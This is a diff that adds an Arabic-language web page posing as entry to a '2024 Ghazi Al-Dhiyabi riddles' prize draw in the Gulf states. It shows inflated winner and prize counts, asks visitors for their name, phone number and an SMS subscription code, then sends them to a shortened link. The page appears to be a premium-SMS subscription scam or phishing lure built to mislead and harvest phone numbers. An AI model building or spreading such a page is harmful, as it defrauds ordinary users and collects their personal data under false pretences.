@@ -1,0 +1,240 @@
+<!DOCTYPE html>
+<html dir="rtl" lang="ar">
+<head>
+    <title>دخول سحب غازي الذيابي</title>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width,shrink-to-fit=no,initial-scale=1,maximum-scale=1,user-scalable=no">
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@500&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.2.3/dist/css/bootstrap.min.css" integrity="sha384-rbsA2VBKQhggwzxH7pPCaAqO46MgnOM80zW1RWuH61DGLwZJEdK2Kadq2F9CUG65" crossorigin="anonymous">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <link rel="icon" href="https://i.ibb.co/JkxSJds/gazy.png" type="image/png">
+    <style type="text/css">
+        body {font-family: 'Cairo', sans-serif;background:#f7f7f7;}
+        .img img {width:120px;height:120px;border-radius:50%;}
+        .title {font-weight:bold;font-size:1.2rem;margin-top:15px;}
+        .step {text-align:right;background:#fff;padding:20px;border-radius:7px;border:1px solid #f1f1f1;}
+        .step .main-title {font-weight:bold;font-size:1.3rem;color:red;margin:5px 0 10px 0;}
+        .step li {font-size:1.1rem;margin:5px 0;}
+        a {text-decoration:none;color:#000;}
+        .country {margin:20px 0;}
+        .country .item {margin:10px 0;border-radius:40px;border:2px solid #000;display:flex;align-items:center;padding:5px;background-color: #fff; cursor: pointer;}
+        .country .item:hover {background-color: #eceaea;}
+        .country .item img {width:50px;height:50px;border-radius:50%;}
+        .country .item .name {width:100%;}
+        .copy {margin:50px 0;color:#666;font-size:.8rem;}
+        .mbc {width:60px;margin-top:5px;}
+        .location {color:#666;}
+        .container-ls {max-width: 500px;margin: 15px auto;}
+
+        /* Modal styles */
+        .modal-backdrop.show {
+            opacity: 0.5;
+        }
+    </style>
+</head>
+<body>
+    <script type="text/javascript">
+        function setAttributeOnload(object, attribute, val) {
+            if(window.addEventListener) {
+                window.addEventListener('load',
+                    function(){ object[attribute] = val; }, false);
+            } else {
+                window.attachEvent('onload', function(){ object[attribute] = val; });
+            }
+        }
+
+        function openModal(country) {
+            document.getElementById("country-name").innerText = country;
+            var modal = new bootstrap.Modal(document.getElementById('subscriptionModal'));
+            modal.show();
+        }
+    </script>
+    
+    <script type="text/javascript" src="https://apis.google.com/js/platform.js"></script>
+    <script type="text/javascript">
+        gapi.load("gapi.iframes:gapi.iframes.style.bubble", function() {
+            if (gapi.iframes && gapi.iframes.getContext) {
+                gapi.iframes.getContext().openChild({
+                    url: 'https://www.blogger.com/navbar.g?targetBlogID\x3d5094481257847135757\x26blogName\x3dtes\x26publishMode\x3dPUBLISH_MODE_BLOGSPOT\x26navbarType\x3dBLUE\x26layoutType\x3dCLASSIC\x26searchRoot\x3dhttps://hhh7hjk.blogspot.com/search\x26blogLocale\x3dar\x26v\x3d2\x26homepageUrl\x3dhttps://hhh7hjk.blogspot.com/?m%3D0\x26vt\x3d5087231601720675360',
+                    where: document.getElementById("navbar-iframe-container"),
+                    id: "navbar-iframe"
+                });
+            }
+        });
+    </script>
+
+    <div class="container container-ls">
+        <div>
+            <center>
+                <div class="img mt-5">
+                    <img src="https://i.ibb.co/JkxSJds/gazy.png">
+                </div>
+                <div class="title">فوازير غازي الذيابي</div>
+                <div class="location"><i class="fa fa-location-dot"></i> <span>السعودية</span></div>
+                <p>دخول سحب في فوازير غازي الذيابي 2024</p>
+
+                <section class="main-content step" style="margin-top:30px;text-align: center;">
+                    <div class="row">
+                        <div class="col-6">
+                            <div class="stat-card">
+                                <div class="stat-card__content">
+                                    <p class="text-uppercase mb-1 text-muted">عدد الفائزين</p>
+                                    <h5><i class="fa fa-users"></i> <b>21,254</b></h5>
+                                    <div>
+                                        <small class="text-success font-weight-bold mr-1"><i class="fa fa-arrow-up"></i> +35%</small>
+                                        <small class="text-muted">مقابل الشهر الماضي</small>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+                        <div class="col-6">
+                            <div class="stat-card">
+                                <div class="stat-card__content">
+                                    <p class="text-uppercase mb-1 text-muted">المبلغ</p>
+                                    <h5><i class="fa fa-dollar"></i> <b>78M</b></h5>
+                                    <div>
+                                        <small class="text-success font-weight-bold mr-1"><i class="fa fa-arrow-up"></i> +35%</small>
+                                        <small class="text-muted">مقابل الشهر الماضي</small>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </section>
+
+                <br>
+                <div class="step">
+                    <div class="main-title">طريقة المشاركة</div>
+                    <ol>
+                        <li>اختر دولتك.</li>
+                        <li>حط رقم جوالك.</li>
+                        <li>رح يوصلك رمز الاشتراك في SMS.</li>
+                        <li>حط الرمز واضغط على تأكيد.</li>
+                    </ol>
+<div>
+    <br>
+    <div class="country">
+        <div class="item" onclick="openModal('السعودية')">
+            <div class="count">
+                <img src="https://cdn.beacons.ai/user_content/PJBFV2HsvNSeVzMktRnXkHiQkno1/referenced_images/9070bc65-dc18-4c61-8095-d5d112a8d1fa__link-in-bio__links-block__home__e0fe3732-e769-4a12-862c-2e2c572b3225__edf8add4-945f-4265-bfb6-caeb304c0044__9d7a05ca-638d-4b73-bb5d-2b933ea37fab.png?t=1678465573970">
+            </div>
+            <div class="name">السعودية</div>
+        </div>
+        <div class="item" onclick="openModal('الكويت')">
+            <div class="count">
+                <img src="https://cdn.beacons.ai/user_content/PJBFV2HsvNSeVzMktRnXkHiQkno1/referenced_images/ab23f33f-9f23-4d0b-bfbd-3e2f89df0e47__link-in-bio__links-block__home__e0fe3732-e769-4a12-862c-2e2c572b3225__f3121d27-88b9-42af-95be-c9445a9677a4__91d1e3c6-f5d6-4ddd-bb5b-69f16a78e774.png?t=1678465590318">
+            </div>
+            <div class="name">الكويت</div>
+        </div>      
+        <div class="item" onclick="openModal('الإمارات')">
+            <div class="count">
+                <img src="https://cdn.beacons.ai/user_content/PJBFV2HsvNSeVzMktRnXkHiQkno1/referenced_images/a176407b-2228-4893-80c3-35c017a6416f__link-in-bio__links-block__home__e0fe3732-e769-4a12-862c-2e2c572b3225__c628bde1-ca77-40c5-8d24-a86105d99d14__e4c30e6f-5de6-4e09-a0bf-c41f1c2fbcc5.png?t=1678465547205">
+            </div>
+            <div class="name">الإمارات</div>
+        </div>
+        <div class="item" onclick="openModal('قطر')">
+            <div class="count">
+                <img src="https://cdn.beacons.ai/user_content/PJBFV2HsvNSeVzMktRnXkHiQkno1/referenced_images/e3308d11-bdcb-49f5-948e-8fde68bf8455__link-in-bio__links-block__home__e0fe3732-e769-4a12-862c-2e2c572b3225__6b42610b-df00-4372-9037-f19ad286fea5__d67f0e1e-7fdd-4d28-9964-2fd944b0c792.png?t=1678465608105">
+            </div>
+            <div class="name">قطر</div>
+        </div>      
+        <div class="item" onclick="openModal('عمان')">
+            <div class="count">
+                <img src="https://cdn.beacons.ai/user_content/PJBFV2HsvNSeVzMktRnXkHiQkno1/referenced_images/578847fe-bc90-4965-8902-02bcc1f73fee__link-in-bio__links-block__home__e0fe3732-e769-4a12-862c-2e2c572b3225__cf3dd311-b5a0-4b7e-a83a-b35f9fee3727__5fdd3c79-1fd0-445e-a078-1d9a03ef7e4e.png?t=1678465624081">
+            </div>
+            <div class="name">عمان</div>
+        </div>          
+        <div class="item" onclick="openModal('باقي الدول الأخرى')">
+            <div class="count">
+                <img src="https://g.top4top.io/p_3220s2h9x1.png">
+            </div>
+            <div class="name">باقي الدول الأخرى</div>
+        </div>          
+        </div>
+    </div>
+</div>
+
+<!-- نافذة منبثقة لطلب الاشتراك -->
+<div id="subscriptionModal" class="modal" style="display:none;">
+    <div class="modal-content">
+        <span class="close" onclick="closeModal()">&times;</span>
+        <h2 style="text-align: center; color: #333; font-weight: bold;">اشترك في السحب</h2>
+        <form id="subscriptionForm">
+            <!-- حقل الاسم يظهر أولاً -->
+            <label for="name" style="font-weight: bold;">الاسم:</label>
+            <input type="text" id="name" name="name" style="padding: 10px; border-radius: 5px; border: 1px solid #ddd; margin-bottom: 10px;" required>
+
+            <!-- حقل رقم الهاتف يظهر فقط بعد إدخال الاسم -->
+            <div id="phoneContainer" style="display:none;">
+                <label for="phone" style="font-weight: bold;">رقم الهاتف:</label>
+                <input type="tel" id="phone" name="phone" style="padding: 10px; border-radius: 5px; border: 1px solid #ddd; margin-bottom: 10px;" required>
+            </div>
+
+            <!-- زر الاشتراك -->
+            <button type="submit" style="background-color: #007bff; padding: 10px; font-size: 1.1rem; font-weight: bold; border-radius: 5px; color: #fff; display:none;" id="subscribeButton">اشترك</button>
+        </form>
+    </div>
+</div>
+
+<script>
+function openModal(country) {
+    document.getElementById('subscriptionModal').style.display = 'block';
+}
+
+function closeModal() {
+    document.getElementById('subscriptionModal').style.display = 'none';
+}
+
+// عرض حقل رقم الهاتف بعد إدخال الاسم
+document.getElementById('name').addEventListener('input', function() {
+    if (this.value.trim() !== "") {
+        document.getElementById('phoneContainer').style.display = 'block';
+        document.getElementById('subscribeButton').style.display = 'block';
+    } else {
+        document.getElementById('phoneContainer').style.display = 'none';
+        document.getElementById('subscribeButton').style.display = 'none';
+    }
+});
+
+// منع إرسال النموذج لإظهار الرسالة فقط
+document.getElementById('subscriptionForm').onsubmit = function(e) {
+    e.preventDefault();
+    window.location.href = 'https://rb.gy/orrsha'; // تحويل إلى الرابط المطلوب
+}
+</script>
+
+<style>
+.modal {
+    position: fixed;
+    z-index: 1;
+    left: 0;
+    top: 0;
+    width: 100%;
+    height: 100%;
+    overflow: auto;
+    background-color: rgba(0, 0, 0, 0.5);
+}
+
+.modal-content {
+    background-color: #fefefe;
+    margin: 10% auto;
+    padding: 20px;
+    border-radius: 10px;
+    width: 90%;
+    max-width: 500px;
+}
+
+.close {
+    color: #aaa;
+    float: right;
+    font-size: 28px;
+    font-weight: bold;
+    cursor: pointer;
+}
+.close:hover,
+.close:focus {
+    color: black;
+}
+</style>
